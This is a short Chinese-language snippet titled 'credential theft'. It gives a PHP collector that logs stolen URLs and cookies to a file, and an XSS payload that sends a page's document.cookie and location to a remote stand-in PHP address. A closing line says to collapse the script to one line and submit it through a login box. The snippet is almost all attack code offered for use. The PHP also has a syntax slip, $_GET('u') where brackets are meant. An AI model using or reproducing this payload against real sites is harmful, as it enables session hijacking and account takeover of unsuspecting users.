## 1.凭证窃取

```PHP
<?php
	$url = $_GET('u');
	$cookie = $_GET('c');
	$fp = fopen('cookie.txt',"a");//打开文件
	fwrite($fp,$url."||".$cookie."\n");//将获取内容进行写入,通过.进行拼接
	fclose($fp);//关闭文件
```

```HTML
<script>
	var url = 'http://远程PHP文件地址?u='+window.location.href+'&c='+document.cookie;
	document.write("<img src="+url+"/>");//发起请求
</script>
```
使用的时候将JS整理为1行，在登陆框提交
